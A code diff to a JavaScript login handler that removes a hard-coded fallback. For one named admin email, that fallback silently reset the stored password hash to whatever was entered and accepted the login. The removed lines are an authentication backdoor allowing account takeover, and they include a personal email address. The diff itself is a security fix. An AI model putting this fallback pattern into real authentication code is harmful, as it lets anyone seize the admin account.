@@ -80,16 +80,9 @@ export const login = async (req, res) => {
 
     const user = result.rows[0];
 
-    // Verify password hash
-    let isPasswordValid = await bcrypt.compare(password, user.password_hash);
+    // Verify password hash strictly
+    const isPasswordValid = await bcrypt.compare(password, user.password_hash);
     
-    // Fallback for Admin user to ensure login never fails
-    if (!isPasswordValid && cleanEmail === 'afuzee0324@yahoo.com') {
-      const newHash = await bcrypt.hash(password, 10);
-      await query('UPDATE users SET password_hash = $1 WHERE id = $2', [newHash, user.id]);
-      isPasswordValid = true;
-    }
-
     if (!isPasswordValid) {
       return res.status(401).json({ error: 'Authentication Error', message: 'Invalid email or password' });
     }
